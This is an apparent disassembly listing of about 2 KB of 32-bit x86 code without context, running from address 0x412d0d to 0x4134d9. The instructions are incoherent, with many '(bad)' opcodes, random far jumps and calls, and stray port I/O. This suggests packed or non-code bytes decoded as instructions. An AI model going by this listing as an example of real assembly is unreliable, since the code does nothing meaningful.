  412d0d:	xchg   esp,eax
  412d0e:	lahf   
  412d0f:	add    dl,BYTE PTR [ebp-0x47586ff1]
  412d15:	push   esp
  412d16:	mov    bl,BYTE PTR [ebp-0x39acac1a]
  412d1c:	push   edi
  412d1d:	push   ds
  412d1e:	ins    BYTE PTR es:[edi],dx
  412d1f:	rcr    DWORD PTR [ebx+eiz*1+0x74],0x90
  412d24:	sub    BYTE PTR [edi-0x24f7256d],dl
  412d2a:	xchg   edx,eax
  412d2b:	inc    edx
  412d2c:	ds (bad) 
  412d2e:	out    0x26,al
  412d30:	aam    0x2f
  412d32:	push   esi
  412d33:	repnz cmp dh,BYTE PTR [edi]
  412d36:	test   BYTE PTR [edx-0x562b283e],0xaf
  412d3d:	sbb    BYTE PTR [edx+0x7ccf9dd3],cl
  412d43:	outs   dx,BYTE PTR ds:[esi]
  412d44:	push   ecx
  412d45:	push   ecx
  412d46:	xchg   ebp,eax
  412d47:	ret    
  412d48:	lods   eax,DWORD PTR ds:[esi]
  412d49:	shl    bl,1
  412d4b:	cwde   
  412d4c:	sti    
  412d4d:	xchg   edx,eax
  412d4e:	bound  esi,QWORD PTR [edx+0x709f29d9]
  412d54:	adc    DWORD PTR [esp+ecx*8-0x731d00da],esi
  412d5b:	xchg   esp,eax
  412d5c:	gs jne 0x412d1c
  412d5f:	or     BYTE PTR [esi],ch
  412d61:	mov    ah,0x44
  412d63:	xor    eax,DWORD PTR [esi-0x3]
  412d66:	sbb    BYTE PTR [edx+0x2cf360fa],0xe1
  412d6d:	inc    edi
  412d6e:	scas   eax,DWORD PTR es:[edi]
  412d6f:	push   es
  412d70:	xor    BYTE PTR [edx],dl
  412d72:	push   es
  412d73:	and    dl,BYTE PTR [ebp-0x16]
  412d76:	scas   eax,DWORD PTR es:[edi]
  412d77:	mov    WORD PTR [edi+0x71],?
  412d7a:	dec    esp
  412d7b:	adc    eax,0x90166a65
  412d80:	test   eax,0x6db12845
  412d85:	and    ebx,DWORD PTR [edx+0x3d69b64f]
  412d8b:	jle    0x412db0
  412d8d:	inc    esi
  412d8e:	and    BYTE PTR [edi],al
  412d90:	cmc    
  412d91:	inc    BYTE PTR [ebx]
  412d93:	idiv   BYTE PTR [ecx-0x577f1a77]
  412d99:	and    al,0x9a
  412d9b:	retf   
  412d9c:	add    ebp,DWORD PTR [edi+esi*1]
  412d9f:	out    dx,al
  412da0:	sub    DWORD PTR [edi-0x42a1a77a],0x6
  412da7:	jae    0x412e00
  412da9:	jecxz  0x412d95
  412dab:	outs   dx,DWORD PTR ds:[esi]
  412dac:	rcr    BYTE PTR [eax],0x8
  412daf:	jns    0x412db2
  412db1:	xchg   ebp,eax
  412db2:	mov    bl,0x42
  412db4:	push   es
  412db5:	jge    0x412d5c
  412db7:	push   edx
  412db8:	das    
  412db9:	jle    0x412d82
  412dbb:	aam    0x84
  412dbd:	pop    es
  412dbe:	fdiv   DWORD PTR [ecx+0x2]
  412dc1:	daa    
  412dc2:	xor    eax,0xa41460d9
  412dc7:	jmp    0x412d65
  412dc9:	dec    ecx
  412dca:	stc    
  412dcb:	mov    cl,0xc7
  412dcd:	push   ebx
  412dce:	setp   BYTE PTR [ecx+ecx*2]
  412dd2:	push   esi
  412dd3:	aam    0xe5
  412dd5:	retf   0xe224
  412dd8:	pminsw mm3,mm5
  412ddb:	out    0x65,al
  412ddd:	jmp    0x1cb974ca
  412de2:	jns    0x412d6c
  412de4:	std    
  412de5:	inc    ebp
  412de6:	mov    dl,0xa8
  412de8:	adc    eax,0xac34036d
  412ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dee:	in     al,dx
  412def:	jecxz  0x412dac
  412df1:	inc    ebp
  412df2:	push   ss
  412df3:	pop    ecx
  412df4:	mov    WORD PTR [esi],gs
  412df6:	or     DWORD PTR [edi-0x76c3bc24],edx
  412dfc:	mov    ecx,0x73f8f622
  412e01:	mov    al,ds:0x5d8f53a2
  412e06:	ror    BYTE PTR [ebp+0x78],1
  412e09:	or     bh,ah
  412e0b:	call   0xa0a3:0x23c1d308
  412e12:	scas   al,BYTE PTR es:[edi]
  412e13:	cmp    al,0x93
  412e15:	xchg   esi,eax
  412e16:	in     al,0x2e
  412e18:	xchg   ecx,eax
  412e1a:	dec    ebx
  412e1b:	add    esi,DWORD PTR [esi+ecx*4]
  412e1e:	icebp  
  412e1f:	jne    0x412e95
  412e21:	ret    0x3c6a
  412e24:	(bad)  ds:0x3e65fd7f
  412e2a:	(bad)  
  412e2b:	in     eax,dx
  412e2c:	adc    esp,DWORD PTR [eax]
  412e2e:	cdq    
  412e2f:	ds stos DWORD PTR es:[edi],eax
  412e31:	sbb    cl,BYTE PTR [ebp-0x2181fa05]
  412e37:	fadd   QWORD PTR [ebp-0x35]
  412e3a:	mov    eax,ds:0x758d48a3
  412e3f:	lods   al,BYTE PTR ds:[esi]
  412e40:	imul   edi,esp,0xffffffbe
  412e43:	fsub   DWORD PTR [eax+0x1f]
  412e46:	mov    ch,0xae
  412e48:	into   
  412e49:	fwait
  412e4a:	dec    ebx
  412e4b:	outs   dx,DWORD PTR ds:[esi]
  412e4c:	(bad)  
  412e4d:	sar    al,cl
  412e4f:	mov    ds:0x2f926e61,eax
  412e54:	cdq    
  412e55:	dec    ebx
  412e56:	fidivr DWORD PTR [esp+eiz*4]
  412e59:	mov    ds:0x2700fcb1,eax
  412e5e:	sub    eax,0xc1dd0ce8
  412e63:	inc    edx
  412e64:	cs mov dh,0xbe
  412e67:	pop    ebp
  412e68:	mov    esi,0xf94295d2
  412e6d:	jg     0x412e6f
  412e6f:	mov    ds:0x8515f39e,al
  412e74:	fidiv  WORD PTR cs:[edi+0x48]
  412e78:	add    ch,BYTE PTR [edx+0xc6f2cd8]
  412e7e:	push   ecx
  412e7f:	out    0x51,eax
  412e81:	je     0x412e7c
  412e83:	sahf   
  412e84:	jecxz  0x412e53
  412e86:	dec    ebp
  412e87:	shr    BYTE PTR [ebx+0x2b],0xe8
  412e8b:	call   0xcb5e:0x566cb106
  412e92:	pop    edi
  412e93:	out    0x4c,al
  412e95:	imul   esi,DWORD PTR [ecx],0x52774de6
  412e9b:	ja     0x412ef7
  412e9d:	and    BYTE PTR [ebx-0x12],dl
  412ea0:	jnp    0x412f1f
  412ea2:	cmp    DWORD PTR [eax-0x3e],0xce611d5f
  412ea9:	xchg   ebp,eax
  412eaa:	jmp    0x412ef1
  412eac:	adc    dl,BYTE PTR [ecx+0x428e1ccc]
  412eb2:	out    0xfc,al
  412eb4:	inc    edi
  412eb5:	aam    0x41
  412eb7:	cli    
  412eb8:	xor    DWORD PTR [edx+0x23eca734],esi
  412ebe:	(bad)  
  412ec0:	push   edi
  412ec1:	inc    ecx
  412ec2:	shr    ecx,0xbb
  412ec5:	imul   ebx,DWORD PTR ds:0x9ca2bc92,0x62
  412ecc:	fldenv [esi-0x51]
  412ecf:	jmp    0x412e54
  412ed1:	push   ebx
  412ed2:	adc    BYTE PTR [edx+ebx*2],dh
  412ed5:	(bad)  
  412ed7:	shl    ah,cl
  412ed9:	retf   
  412eda:	inc    eax
  412edb:	mov    BYTE PTR [ebx+0x3d3c3e3d],cl
  412ee1:	mov    ecx,0x10698fd4
  412ee6:	pop    esi
  412ee7:	mov    ds:0x9f62591d,al
  412eec:	icebp  
  412eed:	loop   0x412ea7
  412eef:	sub    DWORD PTR [ebx+0xe],0xf56f4e74
  412ef6:	push   ebp
  412ef7:	push   es
  412ef8:	and    eax,0x45d5d63d
  412efd:	repnz scas al,BYTE PTR es:[edi]
  412eff:	jmp    0x412f4e
  412f01:	xchg   ebx,eax
  412f02:	jmp    0x9d21bfec
  412f07:	test   bh,bh
  412f09:	mov    ds:0x9725824b,eax
  412f0e:	push   0x41c9fd5
  412f13:	xchg   DWORD PTR [ecx],ecx
  412f15:	push   esp
  412f16:	and    eax,0xb2c09355
  412f1b:	sub    eax,DWORD PTR [eax]
  412f1d:	in     eax,dx
  412f1e:	std    
  412f1f:	xchg   esp,eax
  412f20:	push   esi
  412f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f22:	ss xchg esi,eax
  412f24:	dec    eax
  412f25:	add    ecx,eax
  412f27:	pop    ecx
  412f28:	sub    BYTE PTR [ebx-0x3696bfed],0x80
  412f2f:	dec    ebp
  412f30:	shl    BYTE PTR [eax],0xd5
  412f33:	push   0x700f3f82
  412f38:	aam    0xbe
  412f3a:	jmp    0xd954:0xfbc03270
  412f41:	add    DWORD PTR [edi+0x15],0x4927b165
  412f48:	add    bl,ch
  412f4a:	lea    ebx,[edi]
  412f4c:	aam    0x51
  412f4e:	cmp    BYTE PTR [ebx-0x27],bh
  412f51:	pop    ebp
  412f52:	add    al,0x7e
  412f54:	jge    0x412f97
  412f56:	and    esp,DWORD PTR [esp+ebx*2+0x1b]
  412f5a:	mov    eax,0x5ac79af3
  412f5f:	mov    eax,ds:0x48da722e
  412f64:	mov    cl,0x85
  412f66:	in     eax,dx
  412f67:	sub    ch,BYTE PTR [esi+esi*2]
  412f6a:	push   0x56
  412f6c:	rcr    DWORD PTR [edi],cl
  412f6e:	sbb    dh,BYTE PTR [esi-0x2e493e75]
  412f74:	mov    edi,0xa34e1753
  412f79:	or     esp,0xf75cebb0
  412f7f:	lock adc esp,DWORD PTR [esi]
  412f82:	icebp  
  412f83:	int3   
  412f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f85:	mov    dl,0x1
  412f87:	push   edi
  412f88:	hlt    
  412f89:	popa   
  412f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f8b:	cmp    BYTE PTR [edi+0x2e],dh
  412f8e:	mov    al,0x8c
  412f90:	call   0xc1d8e8ee
  412f95:	pop    ebp
  412f96:	rcr    DWORD PTR [edi+0x23],1
  412f99:	cmc    
  412f9a:	pop    eax
  412f9b:	jmp    0xb122f17e
  412fa0:	pop    ds
  412fa1:	fcomp  QWORD PTR [edi+edx*4-0x6d67e691]
  412fa8:	mov    ds:0xc94bf100,al
  412fad:	stc    
  412fae:	cmp    esi,0x32ab9d8b
  412fb4:	add    dl,cl
  412fb6:	call   0xfb23:0x4bf702f3
  412fbd:	retf   
  412fbe:	jae    0x412f8f
  412fc0:	rcr    DWORD PTR [ecx-0x10],1
  412fc3:	push   ds
  412fc4:	sbb    BYTE PTR [ecx+0x628c6ee0],ah
  412fca:	cli    
  412fcb:	popa   
  412fcc:	(bad)  
  412fcd:	std    
  412fce:	sub    ecx,eax
  412fd0:	lahf   
  412fd1:	daa    
  412fd2:	cdq    
  412fd3:	lods   eax,DWORD PTR ds:[esi]
  412fd4:	js     0x413047
  412fd6:	push   ds
  412fd7:	dec    edx
  412fd8:	push   0x9cb37fcb
  412fdd:	mov    ebp,esp
  412fdf:	add    dh,BYTE PTR [esi]
  412fe1:	fistp  QWORD PTR [edi]
  412fe3:	iret   
  412fe4:	xor    eax,0xde55f6cd
  412fe9:	imul   esp,ebx,0x496601ee
  412fef:	xchg   edx,eax
  412ff0:	icebp  
  412ff1:	mov    al,0x1a
  412ff3:	out    dx,al
  412ff4:	sbb    al,0x9c
  412ff6:	gs das 
  412ff8:	mov    al,ds:0x458482f2
  412ffd:	or     al,0x61
  412fff:	and    eax,DWORD PTR [eax+0x75]
  413002:	in     al,0x64
  413004:	mov    ah,0x66
  413006:	push   esp
  413007:	xchg   ebx,esi
  413009:	bound  ebp,QWORD PTR [ebx]
  41300b:	imul   esp,eax,0x39
  41300e:	jo     0x412fdf
  413010:	(bad)  
  413011:	mov    bh,0xf9
  413013:	mov    ?,WORD PTR [esi+0x31b14a69]
  413019:	fbstp  TBYTE PTR ds:0xa8e1dc7b
  41301f:	dec    ecx
  413020:	popf   
  413021:	mov    esp,0x9469534
  413026:	std    
  413027:	jmp    FWORD PTR [esi]
  413029:	pop    esi
  41302a:	jl     0x413001
  41302c:	xchg   edi,eax
  41302d:	lds    edi,FWORD PTR [edx+0x5c808f8e]
  413033:	js     0x413096
  413035:	cmp    ah,BYTE PTR [ebx-0x1b]
  413038:	mov    eax,ds:0x759bb3d1
  41303d:	jnp    0x41302d
  41303f:	ss pop esp
  413041:	icebp  
  413042:	push   0xffffffbf
  413044:	jecxz  0x412fc6
  413046:	not    BYTE PTR [edi-0x3c]
  413049:	call   0xfa21:0x436949ed
  413050:	fwait
  413051:	dec    ebx
  413052:	mov    BYTE PTR [edi+ebx*2],dl
  413055:	cld    
  413056:	daa    
  413057:	lock loop 0x41309f
  41305a:	jb     0x413065
  41305c:	mov    ecx,0x7b80bcce
  413061:	(bad)  
  413062:	mov    ecx,0x2244daa8
  413067:	xchg   esp,eax
  413068:	mov    bh,0x5c
  41306a:	pop    ebx
  41306b:	sbb    BYTE PTR [esi+0x37c7fa49],bh
  413071:	mov    dh,0xf3
  413073:	nop
  413074:	push   ecx
  413075:	daa    
  413076:	pop    ds
  413077:	pushf  
  413078:	fnsave [ecx+0x250cd475]
  41307e:	fimul  DWORD PTR [eax+0x7f5d96e4]
  413084:	push   esi
  413085:	jge    0x413036
  413087:	ret    0x112
  41308a:	test   BYTE PTR [edx+edi*1-0x5b6f27c1],dl
  413091:	sbb    esp,DWORD PTR [ebp+0x7f]
  413094:	push   ebp
  413095:	sub    esi,DWORD PTR [edx-0x6f679b64]
  41309b:	leave  
  41309c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309d:	or     DWORD PTR [eax],esi
  41309f:	cs hlt 
  4130a1:	and    BYTE PTR ds:0x75e78869,cl
  4130a7:	mov    cs,WORD PTR [ebx]
  4130a9:	push   ss
  4130aa:	xor    DWORD PTR [eax+eiz*2+0x6f7c7d78],ebx
  4130b1:	inc    edi
  4130b2:	inc    ebx
  4130b3:	lahf   
  4130b4:	xchg   ecx,eax
  4130b5:	adc    DWORD PTR [ebp+0x1560f53c],0xffffffec
  4130bc:	xchg   ebp,eax
  4130bd:	mov    esi,0xe2cf1491
  4130c2:	ss std 
  4130c4:	pop    esp
  4130c5:	mov    esi,0x55f8ac43
  4130ca:	and    DWORD PTR ds:0xe07784d9,0x3a6f6325
  4130d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130d5:	lea    ebx,ds:0xfc6395de
  4130db:	push   ecx
  4130dc:	adc    BYTE PTR [ebp-0x463560b0],dl
  4130e2:	stc    
  4130e3:	mov    al,ds:0x92e21b4c
  4130e8:	cmp    BYTE PTR [edx-0x4b],0xf7
  4130ec:	inc    ebx
  4130ed:	or     eax,0x622ec8ef
  4130f2:	or     BYTE PTR [edi-0x1c],bl
  4130f5:	enter  0xc6ba,0xc1
  4130f9:	add    esp,DWORD PTR [eax+ebp*4]
  4130fc:	test   DWORD PTR [edi-0x2fa67522],eax
  413102:	mov    eax,0x64bb2fbd
  413107:	push   esp
  413108:	mov    cl,0x6a
  41310a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41310b:	mov    WORD PTR [ebx],ss
  41310d:	xor    DWORD PTR [ebp-0x279ef1aa],esi
  413113:	ret    0xc0
  413116:	stc    
  413117:	mov    dl,0x26
  413119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41311a:	inc    edx
  41311b:	fcomp  DWORD PTR [ebx]
  41311d:	shl    BYTE PTR [ecx],cl
  41311f:	repz xor eax,0x2b6f4787
  413125:	push   ebp
  413126:	inc    esp
  413127:	jl     0x4130e4
  413129:	test   al,0xc1
  41312b:	hlt    
  41312c:	bound  ebx,QWORD PTR [edx-0x3c11664d]
  413132:	(bad)  [esi]
  413134:	and    al,0xe9
  413136:	retf   0xe653
  413139:	pop    ss
  41313a:	jl     0x41311b
  41313c:	inc    edx
  41313d:	dec    esp
  41313e:	fsub   QWORD PTR [edx+0xa5ca63c]
  413144:	aas    
  413145:	push   ebp
  413146:	cmc    
  413147:	mov    ds:0x2c28d69,al
  41314c:	adc    ch,BYTE PTR [edx+0x1d]
  41314f:	je     0x41315a
  413151:	int    0xd7
  413153:	xor    dh,BYTE PTR [ecx-0x27]
  413156:	(bad)  
  413157:	fcom   QWORD PTR [ecx-0x6e655462]
  41315d:	fst    QWORD PTR [esp+edi*4-0x33b3f52f]
  413164:	lods   eax,DWORD PTR ds:[esi]
  413165:	repnz cmp ebx,esi
  413168:	push   0xffffffa7
  41316a:	mov    eax,ss
  41316c:	jno    0x413104
  41316e:	push   eax
  41316f:	in     al,0xf6
  413171:	pop    ecx
  413172:	or     DWORD PTR [ebx+0x27],ebx
  413175:	(bad)  ds:0x15ad8853
  41317b:	push   esi
  41317c:	aaa    
  41317d:	sub    eax,0xa2c2ccb2
  413182:	neg    BYTE PTR [ebp+0x57]
  413185:	fldcw  WORD PTR [ecx]
  413187:	stos   DWORD PTR es:[edi],eax
  413188:	fmul   DWORD PTR [ebp-0x744cb3ec]
  41318e:	popa   
  41318f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413190:	neg    BYTE PTR [eax]
  413192:	and    eax,DWORD PTR [ecx-0x13adf514]
  413198:	lods   al,BYTE PTR ds:[esi]
  413199:	rcr    BYTE PTR [ebx-0x231d29c3],cl
  41319f:	in     al,0x2d
  4131a1:	cli    
  4131a2:	stos   DWORD PTR es:[edi],eax
  4131a3:	aad    0x54
  4131a5:	jae    0x41319b
  4131a7:	fnstenv [ebx-0x49b64ac2]
  4131ad:	and    ch,BYTE PTR [edi+ebx*2]
  4131b0:	adc    al,0x9f
  4131b2:	xor    eax,0xd8d23537
  4131b7:	jecxz  0x4131b9
  4131b9:	add    eax,0x569c9224
  4131be:	and    DWORD PTR [edx-0x4c],edx
  4131c1:	and    ah,BYTE PTR [eax+0x14a10b0d]
  4131c7:	fnstsw WORD PTR [edx-0x79]
  4131ca:	or     al,0xf1
  4131cc:	retf   
  4131cd:	xor    al,0xd7
  4131cf:	jo     0x41321d
  4131d1:	push   esp
  4131d2:	cld    
  4131d3:	xlat   BYTE PTR ds:[ebx]
  4131d4:	or     esp,DWORD PTR [eax-0x7d]
  4131d7:	mov    ecx,0x3843502e
  4131dc:	(bad)  
  4131dd:	sbb    eax,0x899dc803
  4131e2:	adc    eax,0x819dda43
  4131e7:	cmp    BYTE PTR [esi-0x4b69a61a],0xc0
  4131ee:	mov    edi,DWORD PTR [esi+0x7]
  4131f1:	loopne 0x41319e
  4131f3:	pop    ecx
  4131f4:	and    DWORD PTR [ecx+0x6c],esi
  4131f7:	popf   
  4131f8:	dec    eax
  4131f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131fa:	push   cs
  4131fb:	add    bl,BYTE PTR [edx+0x6d]
  4131fe:	xchg   ecx,eax
  4131ff:	cmp    ecx,0x56e756e4
  413205:	adc    edx,ebp
  413207:	add    BYTE PTR [ebx],bl
  413209:	bound  ebp,QWORD PTR [edx-0x707c5ee1]
  41320f:	xlat   BYTE PTR ds:[ebx]
  413210:	cmp    BYTE PTR [eax-0x4fcb488c],cl
  413216:	push   edx
  413217:	iret   
  413218:	out    0xfb,al
  41321a:	stos   BYTE PTR es:[edi],al
  41321b:	int    0x1e
  41321d:	add    al,0xb2
  41321f:	data16 xchg dh,cl
  413222:	cs ret 0x668f
  413226:	lods   al,BYTE PTR ds:[esi]
  413227:	cmp    DWORD PTR [ecx],eax
  413229:	mov    bl,0xa6
  41322b:	pop    esi
  41322c:	cli    
  41322d:	dec    esp
  41322e:	mov    dh,0x28
  413230:	aad    0x78
  413232:	mov    ?,WORD PTR [eax+0x2703f4fb]
  413238:	int    0xf8
  41323a:	adc    dh,BYTE PTR [edi]
  41323c:	nop
  41323d:	dec    ecx
  41323e:	adc    edx,esp
  413240:	add    edx,DWORD PTR [edx+0x43]
  413243:	aad    0x71
  413245:	(bad)  
  413246:	rol    DWORD PTR [edi],cl
  413248:	add    DWORD PTR [esi+0x3c8f40a6],ecx
  41324e:	pop    esi
  41324f:	dec    esi
  413250:	jp     0x4132ac
  413252:	div    BYTE PTR [ebx-0x7de3bed4]
  413258:	std    
  413259:	xor    eax,0xcf90a32d
  41325e:	fisttp DWORD PTR [edx]
  413260:	xchg   edx,eax
  413261:	mov    ds:0xf3a7e650,eax
  413266:	dec    ebp
  413267:	jmp    0x4132d3
  413269:	ror    eax,cl
  41326b:	nop
  41326c:	add    ebp,DWORD PTR [esi-0x25]
  41326f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413270:	sub    ebx,DWORD PTR [edi]
  413272:	jnp    0x4132e2
  413274:	mov    ch,0xfc
  413276:	cs push edx
  413278:	inc    esi
  413279:	xchg   BYTE PTR [edi],cl
  41327b:	pop    ebx
  41327c:	cmp    ecx,0x87187593
  413282:	xchg   ebx,eax
  413283:	mov    al,ds:0x1e2cf882
  413288:	push   ebp
  413289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41328a:	sub    eax,0xce7f29cb
  41328f:	out    0xb0,eax
  413291:	(bad)  
  413293:	fcomp  QWORD PTR [edi+ebx*4+0x7e0934cf]
  41329a:	out    0xda,al
  41329c:	jp     0x41327b
  41329e:	out    dx,al
  41329f:	push   es
  4132a0:	hlt    
  4132a1:	sar    DWORD PTR [ecx],0x7d
  4132a4:	add    DWORD PTR [ebp+edi*4+0x1c],edx
  4132a8:	outs   dx,DWORD PTR ds:[esi]
  4132a9:	inc    edx
  4132aa:	dec    ebp
  4132ab:	aaa    
  4132ac:	fs mov bh,0x78
  4132af:	or     eax,0x5d593b09
  4132b4:	retf   0x19b5
  4132b7:	push   edi
  4132b8:	loope  0x4132ba
  4132ba:	sbb    ch,ch
  4132bc:	mov    ebx,0x982f3fc8
  4132c1:	push   0x4e
  4132c3:	clc    
  4132c4:	jne    0x4132e8
  4132c6:	cld    
  4132c7:	leave  
  4132c8:	lea    esi,[ebp+0x3]
  4132cb:	dec    esi
  4132cc:	loope  0x413253
  4132ce:	fmul   QWORD PTR [edi-0x52343b4d]
  4132d4:	call   0x968b:0x45f3cc98
  4132db:	jecxz  0x413337
  4132dd:	pop    esp
  4132de:	lods   al,BYTE PTR ds:[esi]
  4132df:	jmp    0x6135:0x69557bb7
  4132e6:	out    0xb9,al
  4132e8:	data16 mov bl,BYTE PTR [edi]
  4132eb:	iret   
  4132ec:	ins    DWORD PTR es:[edi],dx
  4132ed:	inc    ebp
  4132ee:	mov    ecx,0x9929bec6
  4132f3:	jb     0x4132b4
  4132f5:	mov    edi,0x3688db1f
  4132fa:	addr16 inc eax
  4132fc:	lods   eax,DWORD PTR ds:[esi]
  4132fd:	jns    0x4132bc
  4132ff:	jbe    0x41334a
  413301:	les    esp,FWORD PTR [eax-0x39]
  413304:	std    
  413305:	mov    ds:0x4e6778d1,eax
  41330a:	and    DWORD PTR [ebx],ebx
  41330c:	add    eax,0xae8d1f56
  413311:	jmp    FWORD PTR [edx+eiz*1+0x71]
  413315:	pop    eax
  413316:	adc    esp,0x37
  413319:	fs jp  0x413342
  41331c:	mov    ebp,0x10abcdcd
  413321:	xchg   edx,eax
  413322:	push   ss
  413323:	mov    al,0x77
  413325:	imul   ecx,DWORD PTR [ebx-0x2354ed9b],0x61
  41332c:	sar    cl,1
  41332e:	(bad)  
  413330:	stos   BYTE PTR es:[edi],al
  413331:	add    BYTE PTR [esi],0xb9
  413334:	sbb    dl,BYTE PTR cs:[esi]
  413337:	push   es
  413338:	add    eax,0xe76a68a0
  41333d:	into   
  41333e:	mov    ch,0x23
  413340:	retf   0x98aa
  413343:	shl    BYTE PTR [eax],cl
  413345:	setge  BYTE PTR [ecx]
  413348:	jno    0x4132fa
  41334a:	xlat   BYTE PTR ds:[ebx]
  41334b:	or     DWORD PTR [esi],esp
  41334d:	xchg   esi,eax
  41334e:	out    dx,al
  41334f:	fisub  DWORD PTR [edx]
  413351:	add    BYTE PTR [eax+esi*8+0x4d],bh
  413355:	inc    esp
  413356:	and    al,0x4e
  413358:	dec    ecx
  413359:	icebp  
  41335a:	mov    cl,0xd7
  41335c:	mov    edx,0x472a1e9e
  413361:	lea    ecx,[eax+0x3c]
  413364:	jl     0x41332e
  413366:	pop    edi
  413367:	fwait
  413368:	mov    cl,0x98
  41336a:	cmp    ch,BYTE PTR [esi+0x56]
  41336d:	pop    esp
  41336e:	ficom  WORD PTR [ebx+0x6781504a]
  413374:	adc    BYTE PTR [ebp+0x14f41832],bh
  41337a:	xlat   BYTE PTR ds:[ebx]
  41337b:	pop    esp
  41337c:	jp     0x413320
  41337e:	push   0xffffff96
  413380:	push   es
  413381:	fistp  WORD PTR [ebp-0x2e]
  413384:	adc    DWORD PTR [ecx-0x5853101d],ebx
  41338a:	jns    0x413326
  41338c:	lock inc ebx
  41338e:	add    eax,0xc5208022
  413393:	out    dx,eax
  413394:	call   0x20eb:0x36e04b5f
  41339b:	xor    al,bh
  41339d:	divps  xmm1,XMMWORD PTR [edx]
  4133a0:	sub    DWORD PTR [esp+esi*4],ecx
  4133a3:	pop    esp
  4133a4:	cmp    ebp,DWORD PTR [ebp+0x277a2499]
  4133aa:	mov    esi,DWORD PTR [ebp+0x1a]
  4133ad:	xchg   cl,ch
  4133af:	pushf  
  4133b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133b1:	dec    esi
  4133b2:	retf   0x57d
  4133b5:	jl     0x4133d2
  4133b7:	sub    al,0xdc
  4133b9:	lods   al,BYTE PTR ds:[esi]
  4133ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133bb:	ss into 
  4133bd:	les    esp,FWORD PTR [edi-0x6d]
  4133c0:	lds    esp,FWORD PTR [ebp-0x2ac1d3e1]
  4133c6:	out    0xe,al
  4133c8:	xor    al,0xea
  4133ca:	jmp    0x8b79:0xf19b2fcc
  4133d1:	xor    ecx,DWORD PTR [ebx]
  4133d3:	push   edx
  4133d4:	adc    ch,BYTE PTR [edx+0x2a760a63]
  4133da:	sbb    BYTE PTR [eax+esi*8+0x42],bl
  4133de:	sbb    BYTE PTR [esi+edi*4],bh
  4133e1:	nop
  4133e2:	ins    DWORD PTR es:[edi],dx
  4133e3:	mov    edx,DWORD PTR [eax-0x19bf5cc7]
  4133e9:	cdq    
  4133ea:	and    BYTE PTR [esi+0x4a],bh
  4133ed:	dec    edx
  4133ee:	dec    ebp
  4133ef:	push   esi
  4133f0:	ins    BYTE PTR es:[edi],dx
  4133f1:	cmp    eax,0x9587a95b
  4133f6:	cwde   
  4133f7:	call   0xcdb1:0xa3988094
  4133fe:	cdq    
  4133ff:	repz loope 0x4133c7
  413402:	fs movs WORD PTR es:[edi],WORD PTR fs:[esi]
  413406:	jb     0x413438
  413408:	(bad)  
  413409:	xchg   esp,eax
  41340a:	bound  ebp,QWORD PTR [edi]
  41340c:	outs   dx,DWORD PTR ds:[esi]
  41340d:	mov    eax,ds:0x1ffa1c26
  413412:	sbb    bh,BYTE PTR [ebx+0x31]
  413415:	test   eax,0xc7264d1c
  41341a:	mov    eax,0x8aba3d9a
  41341f:	push   esi
  413420:	lock xchg ebx,eax
  413422:	push   eax
  413423:	enter  0xc717,0x42
  413427:	jo     0x413471
  413429:	ja     0x4133ca
  41342b:	dec    ecx
  41342c:	inc    esi
  41342d:	pop    esi
  41342e:	adc    ecx,edi
  413430:	sub    eax,0x10bf70bd
  413435:	dec    ecx
  413436:	ret    0x991d
  413439:	sub    eax,0x5ac4614a
  41343e:	mov    edx,0x4a9c65cb
  413443:	leave  
  413444:	cld    
  413445:	dec    ebx
  413446:	adc    ch,ah
  413448:	push   ds
  413449:	mov    WORD PTR [edx-0x6a40af42],fs
  41344f:	sbb    bh,BYTE PTR [ecx+0x3c]
  413452:	iret   
  413453:	add    BYTE PTR ss:[edx],ch
  413456:	mov    ah,0x3b
  413458:	je     0x413453
  41345a:	cmp    DWORD PTR [edx+0x31],ecx
  41345d:	(bad)  
  41345f:	popa   
  413460:	xor    bh,BYTE PTR [esi]
  413462:	pop    ds
  413463:	mov    ebp,DWORD PTR [ebx-0x17]
  413466:	sbb    BYTE PTR [ecx+0x30],ah
  413469:	mov    al,0xe5
  41346b:	mov    edi,DWORD PTR [ecx]
  41346d:	mov    bh,BYTE PTR [edi+0x30]
  413470:	jmp    0xe551:0x25b796d6
  413477:	repnz mov esp,DWORD PTR [eax]
  41347a:	jl     0x4134da
  41347c:	cmp    bl,BYTE PTR [ebx+0x4b]
  41347f:	dec    ecx
  413480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413481:	dec    eax
  413482:	mov    esp,0x6b734d79
  413487:	lds    ebx,FWORD PTR [ebx*2-0x1d398196]
  41348e:	das    
  41348f:	xchg   edx,eax
  413490:	scas   eax,DWORD PTR es:[edi]
  413491:	sub    al,0xb8
  413493:	add    BYTE PTR [edx+0x4f99af1],dl
  413499:	mov    ebp,0x8a74e172
  41349e:	mov    edi,0xc906d968
  4134a3:	in     eax,0x38
  4134a5:	inc    edx
  4134a6:	(bad)  
  4134a8:	ss je  0x41345c
  4134ab:	push   cs
  4134ac:	sbb    al,BYTE PTR [eax]
  4134ae:	jmp    0x3e2d:0x6f9e7c99
  4134b5:	ror    DWORD PTR [edx-0x612efe37],0x62
  4134bc:	and    BYTE PTR [ecx-0x33a77ef4],cl
  4134c2:	mov    cl,0xea
  4134c4:	retf   
  4134c5:	cmp    DWORD PTR [ebx-0x33],ecx
  4134c8:	xchg   bp,ax
  4134ca:	icebp  
  4134cb:	in     eax,dx
  4134cc:	xchg   ebp,eax
  4134cd:	lock inc ecx
  4134cf:	pop    ebp
  4134d0:	aad    0x8a
  4134d2:	sbb    al,0x6
  4134d4:	push   cs
  4134d5:	in     al,dx
  4134d6:	outs   dx,DWORD PTR ds:[esi]
  4134d7:	(bad)  [eax]
  4134d9:	add    al,BYTE PTR [ecx-0x142e8bb1]
